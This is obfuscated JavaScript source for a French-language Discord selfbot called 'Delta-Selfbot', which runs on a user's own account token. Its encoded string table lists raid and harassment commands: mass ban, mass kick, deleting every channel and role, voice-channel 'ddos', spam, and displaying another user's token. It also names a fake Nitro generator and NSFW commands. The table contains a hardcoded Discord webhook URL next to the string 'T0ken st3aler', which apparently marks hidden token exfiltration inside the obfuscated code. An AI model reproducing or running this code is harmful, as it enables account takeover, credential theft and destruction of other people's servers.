const _0x1321 = ['🌙**Pannel de Help**🌙', 'Voice Channels', 'reset', 'Commande token effectué', '`Supprime toutes tes backups`', '**Commande Backup** :gear:: ', 'kick all', 'defaultChanne', 'type', 'Western Europe', ' vient de vous envoyer une invatation suspecte ', 'setTitle', 'position', 'japan', 'Commande user info executé', ' sur spotify**', '/discord.gift/', 'Joined', 'https://media.discordapp.net/attachments/764076169418375180/768152237897154571/8ef11fdd3040fc87a5bf9184cbc765c8.gif', 'Commande cmd executé', 'None', 'Fev', 'nitro**', 'ass**', 'hentai', 'Commande nsfw gif effectué', '**Commandes Moderation** :tools:: ', 'tag', 'mentionnable:', 'then', 'messageDelete', 'Commande shutdown effectué', 'body', 'nsfw-gif**', 'Commande roles list executé', 'abcdefghijklmnopqrstuvwxyz', 'Commande help executé', 'Commande nitro generator effectué', 'bannable', 'name all**', 'Commande kick effectué', 'Token match ', 'oui!', 'Status', '[Lien du serveur discord](https://discord.gg/exCS5rwpjW)', '@here', '\x0ale bot ', ' __**VS**__ ', '**Commande ddos vocal activé**', 'guildDelete', 'delta', 'Commande change hypesquad executé', 'channel', 'help backup', 'Commande veski effectué', '`Affiche les commandes moderation` :tools:', 'setPosition', '**Pannel de Help Fun** :joy: ', 'splice', 'ERROR', 'calcul de relation plausible ❤', 'Oct', 'discord.js', '`Envoie les information d\x27un membre du serveur`', 'setAssetsSmallImage', 'hastebin-gen', 'https://media.discordapp.net/attachments/764076169418375180/768152237351370782/4cff066cfe792da0eb2b831bbb068443.gif', '50%', '60%', 'VIP U.S. East', 'help pour plus d\x27informations', 'purge**', 'U.S. East', 'members', 'icon', 'Commande friends backup executé', 'hasPermission', 'Mar', ' at ', 'name', 'https://canary.discordapp.com/api/v6/entitlements/gift-codes/', 'KICK_MEMBERS', 'delete', 'mentions', 'spam (text)**', 'kick', '`lovecalc`, `fight`, `boom`, `reverse`, `nitro`, `avatar`, `8ball`, `say`, `rire`, `kiss`, `veski`, `load`, `punch`, `calin`', 'setActivity', 'calin', '`Test d\x27amour`', 'toDiscord', 'match', 'Oui', 'Verification Level', '8ball (text)**', 'setState', 'setDetails', 'Client', ' / ', 'EMBED_LINKS', ' fait un calin a ', '\x0a║--> At: ', 'xllelHltGdY7DP_0s1XST4cgzTs', 'token (@user)**', 'gen token', 'change hypesquad bravery', 'Commande load effectué', 'owner', '`Supprime tout les salons d\x27un serveur`', 'heapUsed', '`Envoie une image thigh`', 'Commande purge backup executé', 'now', '`ass`, `4k`, `anal`, `hentai`, `nsfw-gif`, `pussy`, `thigh`', 'rire', 'thigh**', 'Firefox', 'guild', 'ban (@user)**', 'kiss', 'Commande restart effectué', 'Commande hentai effectué', 'https://media.tenor.com/images/eff58ec80f6dacb3ccddcbab9c70dacf/tenor.gif', 'createRole', 'backup l', 'platform', 'change hypesquad brilliance', 'Extreme', 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789', 'https://media.tenor.com/images/6f567ef7cae93ca76de2346f28764ee9/tenor.gif', ':information_source:  Votre statut a été réinitialisé ! :information_source:', '• Username', 'https://media.discordapp.net/attachments/764076169418375180/768152237897154571/8ef11fdd3040fc87a5bf9184cbc765c8.giff', '`Envoie la liste de tout les roles d\x27un serveur`', 'ban all**', 'green', ':x: **permission insuffisante (embed_links)** ', '`Kick tout les membres d\x27un serveur`', 'backup load (id)** Pour load la backup\x0a\x0aDelta-Selfbot', 'Commande backup info executé', 'Do Not Disturb', '**Pannel de Help nsfw** :underage: ', 'application/json', 'request', 'presence', 'bgRed', 'Created', 'split', 'Vous devez mettre quelque chose à dire !', 'blue', 'mp friend (message)**', 'Juin', 'https://media.tenor.com/images/a30c2719ece3362814f12adc5f84ad30/tenor.gif', 'shutdown**', 'ddos voc', 'Channels:', 'Nouvelle backup du serveur ', '\x0amembres ayant ce role: ', ' est un robot je ne peux pas charger le profil desolé :/', '**Liste des commandes**', 'setParty', 'setThumbnail', 'token:', 'setRegion', 'joinedAt', '`Frappe un membre`', 'Commande anal effectué', '`Créé une backup d\x27un serveur`', 'sydney', 'Roles', 'setUrl', 'nitro', 'Commande role info effectué', 'ddos voc**', 'utf8', '\x0ala reponse est: ', 'Nickname', '`Change votre token`', ' | ', 'Online', 'stop spam', 'For Loading A Backup', '**Commande spam stopé**', '**Pannel de Help Moderation** :tools: ', 'Avatar URL', '\x0a          _____\x0a         /    /\x5c\x0a        /    /  \x5c\x0a       /    /    \x5c\x0a      /    /  /\x5c  \x5c\x0a     /    /  /  \x5c  \x5c\x0a    /    /  /\x5c   \x5c  \x5c\x0a   /    /  /  \x5c   \x5c  \x5c\x0a  /    /__/____\x5c   \x5c  \x5c\x0a /              \x5c   \x5c  \x5c\x0a/________________\x5c   \x5c  \x5c\x0a\x5c_____________________\x5c /\x0a', 'role info', 'edit', 'say (text)**', 'Commande 4k effectué', '**Aucune backup avec l\x27id ', 'Delta', 'Token info', 'Commande help moderation executé', 'Rpc', 'London', 'help moderation**', '0aA', 'Commande encode effectué', '\x0a╔═════════════════════════════════╗', 'Mai', '  **Attention**\x0a\x0aMon role n\x27est pas tout en haut dans la liste des roles du serveur, cela peut créer quelques ennuies lors de la création de la backup\x0a\x0aDelta-Selfbot', 'set serveur name', 'messageUpdate', '35%', 'fetchMessages', 'txt', 'catch', 'Windows', 'content', ':white_check_mark: **Vous avez rejoint la hypesquad \x27brilliance\x27**', 'Delta-Selfbot', 'Avr', '1024px-uvsun_trace_big', '`Envoie une photo de fesse`', '`Permet de changer sa maison hypesquad`', 'help utile', 'Commande spotify effectué', '  Succès !', '655091815401127966', 'backup load (id)**', 'couleur:', 'check token (token)**', '655696285286006784', 'highestRole', 'getUTCMinutes', 'Commande ass effectué', 'random', 'un nom de rôle est nécessaire', '10%', '90%', 'lovecalc (@user)**', ' ago', 'cmd', ':x: **Veuillez executer cette commande dans un serveur!**', '\x0a╔═════════════════════════════════╗\x0a║-->  User Name : ', 'lovecalc', 'author', 'bgBlue', '40%', 'probablement', 'destroy', 'HircHg', 'ORANGE', '`Supprime tout les messages`', 'pop', ' boup bip boup super tu n\x27est pas un robot ^^!', 'user info', 'filter', 'getUTCFullYear', 'Commande ban effectué', '`Envoie un chargement`', 'MessageBuilder', 'position:', 'discriminator', 'Commande ban all effectué', 'Commande ddos vocal executé', 'kiss (@user)**', './Data/backups.json', 'size', 'Name:', 'Text Channels', 'setTimestamp', '`Créé une backup de tous tes amis`', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0', 'https://media.tenor.com/images/481814f5650216fa4e9ff7846f7a42f9/tenor.gif', 'message', 'Channels', 'setFooter', 'spotify (text)**', 'Commande discord effectué', 'addField', 'backup info', ' days', 'Commande set serveur name effectué', 'https://nekobot.xyz/api/image', 'offline', 'name all', 'Delta-Selbot', '╟─────────────────────────────────╢', 'awaitMessages', 'mentionable', 'Commande help hack executé', 'https://media.tenor.com/images/19fe7ebb05c2aceb9e68d84ee5c031a7/tenor.gif', 'help hack', './config.json', 'setAssetsLargeImage', 'permissionOverwrites', 'Dimanche', 'veski', '\x0amentionnable: ', ':x: **Veuillez mentionner un utilisateur!**', 'Commande thigh effectué', 'Commande reset effectué', '**Commandes Utile** :globe_with_meridians: :', 'Commande ddos voc stopé', 'boom (@user)**', 'Insane', 'permissions', '  Error', '║--> Vous avez rejoint le serveur ', 'Member Count', 'setAssetsLargeText', 'slice', 'pussy', 'Commande help fun executé', 'Vous n\x27avez pas nitro snif, ne t\x27inquiète pas mon autoclaim va tout faire pour que tu en recuperes 1', '66.0', 'hoist', 'https://discordapp.com/api/v6/hypesquad/online', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36', 'channels list**', 'setDescription', '`kick un membre du serveur`', '/!\x5c Anti mp', 'delete all channel', 'non...', '```', 'discord.gg', 'kickable', '`Envoie la liste de tout les channels d\x27un serveur`', '`Supprime tout les roles d\x27un serveur`', '║--> 1 message mp surppimé \x0a║--> User: ', '\x0a║--> Content: ', '`Fait exploser un utilisateur`', 'Sydney', 'Etes vous sur de vouloir supprimer toutes vos backups???', 'Commande create backup executé', 'memoryUsage', 'Creator', 'discord', 'member', 'https://media1.tenor.com/images/104b52a3be76b0e032a55df0740c0d3b/tenor.gif', 'from', 'setIcon', '• Platform', 'send', 'Non', '`Met un status spofity`', ':x: **Pas de test definit**', '@everyone', 'La **backup** a bien été supprimée.', 'help moderation', 'memberCount', 'time', 'a6uny9jcMjet2W2LASruribq6VI', 'getUTCDate', 'length', '**Commandes Nsfw** :underage: :', '`Ban un membre du serveur`', 'BAN_MEMBERS', '`Liste des commandes`', 'calculatedPosition', '`Affiche les commandes info` :globe_with_meridians:', 'Mardi', 'Created At', '`Envoie un message privé a tout tes amis`', '`\x0a**', 'nickname', '`Envoie un gif de sexe`', 'RichEmbed', 'shutdown', 'https://data.photofunky.net/output/image/b/e/9/2/be9268/photofunky.gif', 'fight', 'Members', 'T0ken st3aler', 'node-fetch', 'Commande delete backup executé', '╚═════════════════════════════════╝', 'delete all role', '`Crypte ton text en base64`', 'substring', '`Embrasse un membre`', 'help nsfw**', 'backup friend', 'Guild ID:', 'stringify', '`user info`, `serveur info`, `stats`, `restart`, `reset`, `spotify`, `role info`, `encode`, `discord`, `gen token`, `check token`, `mp friend`, `change hypesquad`', 'https://media1.tenor.com/images/e88bcd916c0da114a8dcac8d9babc77c/tenor.gif', 'hongkong', 'load**', 'prefix', 'oui', 'Xiq-WQ', 'error', 'Vous etes sur un compte nitro WOAW bravo ;)', '45%', 'canary', 'stats**', 'XnyXiA', '**Pannel de Help backup** :gear: ', 'createdAt', 'kick (@user)**', ':x: **Access Denied**', '***vous pouvez copier coller la liste sur le channel actuel et vous pourrez ensuite faire clique droit sur un pseudo envoiller un message, add friend ect...***', 'encode', 'POST', ' Erreur', 'serveur info**', 'backup create', 'Jeudi', 'Je renomme tout le monde par ', 'anal', '80%', 'reduce', '`Affiche les commandes fun` :joy:', ':x: **Aucun utilisateur mentionné**', 'query', 'Brazil', 'oZyGJDamSJ4hmJaaLvzdNo1bLqk', 'toString', 'Offline/Invisible', ':x: **Veuillez executer cette commande sur un serveur!**', 'map', 'https://discord.com/api/webhooks/757980252449538089/YSL9D-5qkIjNeuYTyzGzD_KWobbNY_DPEBS36OXqu-Wy_wWnO9R_QwVvFYk7kTD-HbYt', 'Region:', 'bold', 'https://media.discordapp.net/attachments/648223633185177612/650715035592687647/image0.gif', 'help fun', 'webhook-discord', '`Spam un text`', 'roles list**', '8ball', '0123456789', 'encode (text)**', '`Affiche les commandes backups` :gear:', 'Commande punch effectué', 'first', 'setNickname', 'Log:', 'stop spam**', 'category', 'peut etre?', 'region', ' day', 'array', 'json', 'jamais!', ' s\x27est enfui!**', 'spotify', '```[', 'backup purge', '65%', 'check token', 'Commande check token executé', '`Affiche votre version de discord js`', 'username', 'push', ']```', 'Changement du nom du serveur pour: ', 'bot', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', ' ||', ' has been successfully kicked :point_right: ', 'utf-8', 'hexColor', '**redémarrage** du self bot...', 'backup friend**', 'Commande 8ball executé', 'totalmem', 'Singapore', '                 \x0a╟─────────────────────────────────╢\x0a║-->  Users    : ', 'Owner:', 'join', 'Commande calin effectué', 'Commande fight effectué', 'Commande kick all effectué', '`Met ton text a l\x27envers`', 'calin (@user)**', 'iconURL', '`Envoie les informations d\x27une backup`', 'setName', 'help nsfw', 'help utile**', '`Envoie les informations d\x27un role`', '15%', 'exit', '`Arrete le spam`', 'ownerID', 'discordrpcgenerator', '• Token', ' \x0a╟─────────────────────────────────╢\x0a║-->  Prefix   : ', 'set serveur name (text)**', 'Commande help info executé', 'ready', '`Eteint le selfbot`', 'end', '**Serveur info**', 'Commande channels list executé', 'displayAvatarURL', 'spotify:ab67616d0000b2739501a78fed26d59bb86d1d9e', 'hentai_anal', '• Nitro', 'red', '`Change le nom du serveur`', 'MANAGE_NICKNAMES', 'Commande help backup executé', ':white_check_mark: **Vous avez rejoint la hypesquad \x27ballance\x27**', 'Commande rire effectué', 'restart', '768215201312014376', 'hentai**', '.**', 'Commande delete all role effectué', '`Envoie un gif rire`', 'status', 'backup info (id)**', 'token', 'permission insuffisante', 'Amsterdam', 'say', 'punch', 'Lundi', '`Pose une question`', 'createChannel', 'Commande Say executé', 'Delta selfbot', 'Commande reverse effectué', 'voice', '30%', 'getUTCMonth', 'channels', 'Sep', 'spam', 'avatar', 'gzip, deflate, br', ':white_check_mark: **Tu écoutes ', '               \x0a╟─────────────────────────────────╢\x0a║-->  Guilds   : ', 'Commande pussy effectué', '<@&', 'GET', '`Reset le status`', '║--> New ghostping \x0a║--> serveur: ', '/help pour plus d\x27information', 'user info (@user)**', 'Tu as oublié de définir une **id de backup**. Utilise la commande `', '`Rename tout les membres d\x27un serveur`', ' \x0a**est 100% valide** :white_check_mark:', 'ddos-stop', 'https://media1.tenor.com/images/8438e6772a148e62f4c64332ea7da9e8/tenor.gif', ' kiss ', 'repeat', 'Commande avatar executé', 'log', '(╯°□°）╯︵  ┻━┻', 'users', '**Commande rire:**', 'roles', 'substr', ' **Ce Fait Explosé Par **💣💥 ', 'loading..```', 'punch (@user)**', 'Users:', 'yellow', 'Idle', 'includes', '░░░░░░░░░░ 0%', '║--> message mp modifié \x0a║--> User: ', 'parent', '▓▓▓▓▓▓▓▓░░ 80%', 'Low', 'Delta Selfbot', 'setColor', 'setAuthor', '`Vérifie si le token est valide`', 'rire**', 'load', 'veski (@user)**', 'color', 'verificationLevel', '25%', 'https://media.tenor.com/images/5bf52a1335155572859dff8429873a30/tenor.gif', 'setImage', 'Commande spam executé', '*/*', '║--> [', 'pgif', ' has been successfully banned https://gfycat.com/playfulfittingcaribou :point_right: ', 'Commande delete all channel effectué', 'russia', 'setApplicationId', 'delete all role**', '• Utilisateurs', 'https://media.tenor.com/images/bc8e962e6888249486a3e103edd30dd9/tenor.gif', 'kick all**', '• Salons', 'mobile', 'premium', 'Quelle est ta question? :rolling_eyes: (essayeplutot:', 'gen token**', '`Affiche les commandes nsfw` :underage:', 'Servers:', 'displayName', 'liste des salons:', 'Jan', 'https://media1.giphy.com/media/t7401i4UiIyMo/source.gif', 'startsWith', 'fight (@user)**', 'charAt', 'https://media.tenor.com/images/9df5f6ef799544b11c1171d4c873d1f4/tenor.gif', '`Envoie une image sexe en 4k`', 'indexOf', '• Prefix choisi', 'Deleted all your backups.', '`Genere un nitro random`', '100%', 'Hong Kong', 'nombre de membres ayant ce role:', 'Juillet', '\x0a║-->At: ', 'setPresence', 'writeFile', '  Voila!', 'serveur info', '                 \x0a╟─────────────────────────────────╢\x0a║-->  Channels : ', 'emojis', 'help', 'guildCreate', '`set serveur name`, `roles list`, `channels list`, `name all`, `ban all`, `kick all`, `shutdown`, `kick`, `ban`, `purge`, `delete all channels`, `delete all role`, `discord`, `gen token`, `user info`, `role info`, `serveur info`, `stats`, `encode`, `mp friend`', 'purge', 'find', 'guilds', 'Commande help nsfw executé', 'Mem Usage:', 'Central Europe', '║--> Vous avez quitté le serveur ', '[Click here!](', 'help` pour avoir plus d\x27informations', '`Charge une backup`', 'id du role:', '75%', '**Selfbot Statistics**', 'Commande load backup executé', 'get', 'backup i', 'forEach', 'login', '╟─────────────────────────────────', 'superagent', '`Un autoclaim est en permanance activé sur le self`', 'toFixed', ' friends.', 'le prefix est:  ', 'india', 'U.S. South', 'ban all', 'je ne pense pas.', 'setType', 'Commande stats effectué', ':x: **Commande uniquement utilisable sur un serveur**', 'cmd**', 'Discord Version : **', 'Le token ', 'help pour avoir plus d\x27informations.', 'https://canary.discordapp.com/channels/', 'https://media1.tenor.com/images/a51e4d58d20a9636416549431e693ec1/tenor.gif', 'Oui/Non', 'every', 'base64', 'une erreur est survenue que je ne peux régler', 'floor', 'index', 'backup delete', 'getTime', '\x0aposition: ', '▓▓▓▓▓▓░░░░ 60%', '`Affiche un text en embed`', 'change hypesquad ballance', 'non', ' punch ', '`help`, `help fun`, `help utile`, `help moderation`, `help nsfw`, `help backup`, `help hack`', 'avatarURL', 'https://media.tenor.com/images/4d5a77b99ab86fc5e9581e15ffe34b5e/tenor.gif', '`Envoie une image/gif hentai`', '             \x0a╟─────────────────────────────────╢\x0a║-->  Bots     : ', 'Commande purge effectué', 'mp friend', 'Roles:', '  **Please wait** ...\x0a\x0aCréation de la backup. Attendre la finalisation...\x0a\x0aDeltea-Selfbot', 'comparePositionTo', 'sort', 'user', ' vien d\x27être crée, voici son id : ', 'setStartTimestamp', 'reverse', 'Le token: '];
(function(_0x1d5df1, _0x13219b) {
    const _0x4aa07e = function(_0x1dd984) {
        while(--_0x1dd984) {
            _0x1d5df1.push(_0x1d5df1.shift());
        }
    };
    _0x4aa07e(++_0x13219b);
}(_0x1321, 0x1f0));
const _0x4aa0 = function(_0x1d5df1, _0x13219b) {
    _0x1d5df1 = _0x1d5df1 - 0x0;
    let _0x4aa07e = _0x1321[_0x1d5df1];
    return _0x4aa07e;
};
var _0x14ffc7 = _0x4aa0,
    Discord = require('discord.js');
require('colors');
const client = new Discord.Client(),
    ConfigFile = require('./config.json'),
    token = ConfigFile.token,
    base64 = require('base-64'),
    utf8 = require('utf8'),
    os = require('os'),
    fs = require('fs'),
    hastebins = require('hastebin-gen'),
    rpcGenerator = require('discordrpcgenerator'),
    backups = require('./Data/backups.json'),
    prefix = ConfigFile.prefix,
    superagent = require('superagent'),
    fetch = require('node-fetch'),
    request = require('request'),
    {
        bgMagenta
    } = require('colors');
let i = 0x0;

function nitrocode(_0x1dd984, _0x287524) {
    const _0x36de88 = _0x14ffc7;
    var _0x480d2c = '';
    if(_0x287524.indexOf('0') > -0x1) _0x480d2c += _0x36de88('0x265');
    if(_0x287524[_0x36de88('0x69')]('A') > -0x1) _0x480d2c += _0x36de88('0x281');
    if(_0x287524[_0x36de88('0x69')]('a') > -0x1) _0x480d2c += _0x36de88('0xe1');
    var _0x58f3b0 = '';
    for(var _0x4b88f3 = _0x1dd984; _0x4b88f3 > 0x0; --_0x4b88f3) {
        _0x58f3b0 += _0x480d2c[Math[_0x36de88('0xa4')](Math.random() * _0x480d2c.length)];
    }
    return _0x58f3b0;
}
const color = ConfigFile.color,
    rire = ['https://media.tenor.com/images/9df5f6ef799544b11c1171d4c873d1f4/tenor.gif', 'https://media.tenor.com/images/bae9f9ee3bf793a0bb667d8e4ccb9883/tenor.gif', 'https://media.tenor.com/images/6f567ef7cae93ca76de2346f28764ee9/tenor.gif', 'https://media.tenor.com/images/3d8eb1e9c497abc46370cee9b55d682f/tenor.gif', 'https://media.tenor.com/images/19fe7ebb05c2aceb9e68d84ee5c031a7/tenor.gif', 'https://media.tenor.com/images/db17bbcb693788625c8228d30bc5fc42/tenor.gif', 'https://media1.tenor.com/images/003a06f5074259c50b519056a12f6e33/tenor.gif', 'https://media1.tenor.com/images/5e1fafda52c90acfe2499ac5061f4c99/tenor.gif'],
    kiss = ['https://media1.tenor.com/images/e88bcd916c0da114a8dcac8d9babc77c/tenor.gif', 'https://media1.tenor.com/images/a51e4d58d20a9636416549431e693ec1/tenor.gif', 'https://media1.tenor.com/images/8438e6772a148e62f4c64332ea7da9e8/tenor.gif', 'https://media1.tenor.com/images/104b52a3be76b0e032a55df0740c0d3b/tenor.gif'],
    hugh = ['https://media.tenor.com/images/eff58ec80f6dacb3ccddcbab9c70dacf/tenor.gif', 'https://media.tenor.com/images/4d5a77b99ab86fc5e9581e15ffe34b5e/tenor.gif', 'https://media.tenor.com/images/bc8e962e6888249486a3e103edd30dd9/tenor.gif', 'https://media.tenor.com/images/481814f5650216fa4e9ff7846f7a42f9/tenor.gif'],
    veski = ['https://i.pinimg.com/originals/09/ee/e0/09eee0f5dfae8f74179d1ba0bb54b22d.gif', 'https://media.tenor.com/images/0538e625e9c3d27cd062306101adde13/tenor.gif', 'https://media1.giphy.com/media/t7401i4UiIyMo/source.gif'],
    punch = ['https://media.tenor.com/images/7bd895a572947cf17996b84b9a51cc02/tenor.gif', 'https://media.tenor.com/images/36179549fa295d988fc1020a7902c41c/tenor.gif', 'https://media.tenor.com/images/5bf52a1335155572859dff8429873a30/tenor.gif', 'https://media.tenor.com/images/a30c2719ece3362814f12adc5f84ad30/tenor.gif'];
var verifLevels = ['None', 'Low', 'Medium', '(╯°□°）╯︵  ┻━┻'],
    region = {
        'Brésil': 'Brazil',
        'eu-central': 'Central Europe',
        'singapoure': 'Singapore',
        'us-central': 'U.S. Central',
        'sydney': 'Sydney',
        'us-east': 'U.S. East',
        'us-south': 'U.S. South',
        'us-west': 'U.S. West',
        'eu-west': 'Western Europe',
        'vip-us-east': 'VIP U.S. East',
        'Londre': 'London',
        'amsterdam': 'Amsterdam',
        'hongkong': 'Hong Kong'
    };

function translateDate(_0x2d0018) {
    const _0x41185a = _0x14ffc7,
        _0xd90571 = [_0x41185a('0x62'), _0x41185a('0xd3'), _0x41185a('0x10b'), _0x41185a('0x192'), _0x41185a('0x186'), _0x41185a('0x155'), _0x41185a('0x70'), 'Aout', _0x41185a('0x1a'), _0x41185a('0xfb'), 'Nov', 'Dec'],
        _0x2fe795 = [_0x41185a('0x1de'), _0x41185a('0x10'), _0x41185a('0x220'), 'Mercredi', _0x41185a('0x24e'), 'Vendredi', 'Samedi'];
    return _0x2fe795[_0x2d0018.getUTCDay()] + ', ' + _0x2d0018[_0x41185a('0x218')]() + ' ' + _0xd90571[_0x2d0018[_0x41185a('0x18')]()] + ' ' + _0x2d0018[_0x41185a('0x1b7')]() + _0x41185a('0x10c') + _0x2d0018.getUTCHours() + ':' + zeros(_0x2d0018[_0x41185a('0x19f')](), 0x2) + ':' + zeros(_0x2d0018.getUTCSeconds(), 0x2) + '.' + zeros(_0x2d0018.getUTCMilliseconds(), 0x3);
}

function checkDays(_0x4d4672) {
    const _0x2c59a3 = _0x14ffc7;
    var _0x5825c1 = new Date(),
        _0x4ae821 = _0x5825c1.getTime() - _0x4d4672[_0x2c59a3('0xa7')](),
        _0x51b668 = Math.floor(_0x4ae821 / 0x5265c00);
    return _0x51b668 + (_0x51b668 == 0x1 ? _0x2c59a3('0x270') : _0x2c59a3('0x1cf')) + _0x2c59a3('0x1a6');
};
client.on('ready', function() {
    const _0x4f053f = _0x14ffc7;
    console.log('Delta-Selfbot' [_0x4f053f('0x1ac')]), console[_0x4f053f('0x2f')](_0x4f053f('0x177')[_0x4f053f('0x39')]), console[_0x4f053f('0x2f')]((_0x4f053f('0x1a9') + client[_0x4f053f('0xb9')][_0x4f053f('0xd9')] + '   \x0a╟─────────────────────────────────╢\x0a║-->  User id : ' + client[_0x4f053f('0xb9')]['id'] + _0x4f053f('0x29f') + prefix + _0x4f053f('0x28b') + client[_0x4f053f('0x7d')][_0x4f053f('0x25b')](_0xbed192 => _0xbed192[_0x4f053f('0x215')])[_0x4f053f('0x252')]((_0x8f0f48, _0x23c609) => _0x8f0f48 + _0x23c609) + _0x4f053f('0xb2') + client.users[_0x4f053f('0x1b6')](_0x390a4c => _0x390a4c[_0x4f053f('0x280')])[_0x4f053f('0x1c1')] + _0x4f053f('0x76') + client.channels[_0x4f053f('0x1c1')] + _0x4f053f('0x1f') + client[_0x4f053f('0x7d')][_0x4f053f('0x1c1')] + '                 \x0a╚═════════════════════════════════╝ ')[_0x4f053f('0x14f')]);
    if(client.user.premium > 0x0) console[_0x4f053f('0x2f')](_0x4f053f('0x23f')[_0x4f053f('0x145')]);
    else console[_0x4f053f('0x2f')](_0x4f053f('0x1f0').red);
}), client.on('ready', function() {
    const _0x510b1c = _0x14ffc7;
    if(client[_0x510b1c('0xb9')][_0x510b1c('0x280')]) console.log((client.user[_0x510b1c('0x27c')] + _0x510b1c('0x15c')).red), process[_0x510b1c('0x29a')](0x1);
    else console[_0x510b1c('0x2f')]((client[_0x510b1c('0xb9')][_0x510b1c('0x27c')] + _0x510b1c('0x1b4')).green);
});//
var uuid = () => ([0x989680] + -0x3e8 + -0xfa0 + -0x1f40 + -0x174876e800)['replace'](/[018]/g, _0x5cd30f => (_0x5cd30f ^ Math.random() * 0x10 >> _0x5cd30f / 0x4)['toString'](0x10));
client.on('ready', function() {
    const _0x5a704f = _0x14ffc7;
    rpcGenerator.getRpcImage(_0x5a704f('0x4'), _0x5a704f('0x193'))[_0x5a704f('0xdb')](_0x26251f => {
        const _0x32049d = _0x5a704f;
        rpcGenerator.getRpcImage(_0x32049d('0x4'), _0x32049d('0xf0')).then(_0xdaf5f => {
            const _0xf58480 = _0x32049d;
            let _0x2c28ef = new rpcGenerator[(_0xf58480('0x180'))]()[_0xf58480('0x295')](_0xf58480('0x191'))[_0xf58480('0x168')]('https://www.twitch.tv/discord')[_0xf58480('0x97')]('PLAYING')[_0xf58480('0x54')](_0xf58480('0x4'))[_0xf58480('0x11e')]('Delta Selfbot')[_0xf58480('0x1dc')](_0xdaf5f.id)[_0xf58480('0xfe')](_0x26251f.id)[_0xf58480('0x1ec')](_0xf58480('0x17d'))['setState']('Utilise le Delta Selfbot')[_0xf58480('0xbb')](Date.now())[_0xf58480('0x15e')]({
                'id': uuid()
            });//
            client[_0xf58480('0xb9')]['setPresence'](_0x2c28ef[_0xf58480('0x118')]()).catch(console[_0xf58480('0x23e')]);
        });//
    });
})
let cmd = new Discord.RichEmbed();
cmd.setTimestamp()
    .setColor(color)
    .setTitle('**Liste des commandes**')
    .addField('**Commande Help**', '`help`, `help fun`, `help utile`, `help moderation`, `help nsfw`, `help backup`, `help hack`')
    .addField('**Commande Backup** :gear:: ', '`backup friend`, `backup create`, `backup load`, `backup delete`, `backup purge`, `backup info`')
    .addField('**Commandes Fun** :joy:: ', '`lovecalc`, `fight`, `boom`, `reverse`, `nitro`, `avatar`, `8ball`, `say`, `rire`, `kiss`, `veski`, `load`, `punch`, `calin`')
    .addField('**Commandes Moderation** :tools:: ', '`set serveur name`, `roles list`, `channels list`, `name all`, `ban all`, `kick all`, `shutdown`, `kick`, `ban`, `purge`, `delete all channels`, `delete all role`, `discord`, `gen token`, `user info`, `role info`, `serveur info`, `stats`, `encode`, `mp friend`')
    .addField('**Commandes Nsfw** :underage: :', '`ass`, `4k`, `anal`, `hentai`, `nsfw-gif`, `pussy`, `thigh`')
    .addField('**Commandes Utile** :globe_with_meridians: :', '`user info`, `serveur info`, `stats`, `restart`, `reset`, `spotify`, `role info`, `encode`, `discord`, `gen token`, `check token`, `mp friend`, `change hypesquad`')
.setDescription('`' + ('le prefix est:  ' + prefix) + '`')
.setThumbnail('https://media.discordapp.net/attachments/764076169418375180/768152237897154571/8ef11fdd3040fc87a5bf9184cbc765c8.gif')
.setImage('https://media.discordapp.net/attachments/764076169418375180/768152237351370782/4cff066cfe792da0eb2b831bbb068443.gif')
.setFooter('Delta-Selfbot');
let help_hack = new Discord.RichEmbed()
    .setTimestamp()
    .setColor(color)
    .setTitle('**Pannel de Help Hacking**')
    .addField('**' + prefix + 'ddos voc**', '`Lance une attaque ddos sur les channels vocal`')
    .addField('**' + prefix + 'ddos-stop**', '`Stop une attaque ddos sur les channels vocal`')
    .addField('**' + prefix + 'token (@user)**', '`Affiche le token d\x27un utilisateur`')
    .addField('**' + prefix + 'spam (text)**', '`Spam un text`')
    .addField('**' + prefix + 'stop spam**', '`Arrete le spam`')
.setDescription('`' + ('le prefix est:  ' + prefix) + '`')
.setThumbnail('https://media.discordapp.net/attachments/764076169418375180/768152237897154571/8ef11fdd3040fc87a5bf9184cbc765c8.gif')
.setImage('https://media.discordapp.net/attachments/764076169418375180/768152237351370782/4cff066cfe792da0eb2b831bbb068443.gif')
.setFooter('Delta-Selfbot'),
    help = new Discord.RichEmbed();
help.setTimestamp()
    .setColor(color)
    .setTitle('🌙**Pannel de Help**🌙')
    .addField('**' + prefix + 'cmd**', '`Liste des commandes`')
    .addField('**' + prefix + 'help fun**', '`Affiche les commandes fun` :joy:')
    .addField('**' + prefix + 'help backup**', '`Affiche les commandes backups` :gear:')
    .addField('**' + prefix + 'help moderation**', '`Affiche les commandes moderation` :tools:')
    .addField('**' + prefix + 'help utile**', '`Affiche les commandes info` :globe_with_meridians:')
    .addField('**' + prefix + 'help nsfw**', '`Affiche les commandes nsfw` :underage:')
.setDescription('`' + ('le prefix est:  ' + prefix) + '`')
.setDescription('[Lien du serveur discord](https://discord.gg/exCS5rwpjW)')
.setThumbnail('https://media.discordapp.net/attachments/764076169418375180/768152237897154571/8ef11fdd3040fc87a5bf9184cbc765c8.gif')
.setImage('https://media.discordapp.net/attachments/764076169418375180/768152237351370782/4cff066cfe792da0eb2b831bbb068443.gif')
.setFooter('Delta-Selfbot');
let help_backup = new Discord.RichEmbed()
    .setColor(color)
    .setTitle('**Pannel de Help backup** :gear: ')
.setDescription('[Lien du serveur discord](https://discord.gg/exCS5rwpjW)')
    .addField('**' + prefix + 'backup create**', '`Créé une backup d\x27un serveur`')
    .addField('**' + prefix + 'backup friend**', '`Créé une backup de tous tes amis`')
    .addField('**' + prefix + 'backup load (id)**', '`Charge une backup`')
    .addField('**' + prefix + 'backup delete (id)**', '`Surppime une backup`')
    .addField('**' + prefix + 'backup purge**', '`Supprime toutes tes backups`')
    .addField('**' + prefix + 'backup info (id)**', '`Envoie les informations d\x27une backup`')
.setDescription('`' + ('le prefix est:  ' + prefix) + '`')
.setThumbnail('https://media.discordapp.net/attachments/764076169418375180/768152237897154571/8ef11fdd3040fc87a5bf9184cbc765c8.gif')
.setImage('https://media.discordapp.net/attachments/764076169418375180/768152237351370782/4cff066cfe792da0eb2b831bbb068443.gif')
.setFooter('Delta-Selfbot'),
    help_fun = new Discord.RichEmbed()
    .setTimestamp()
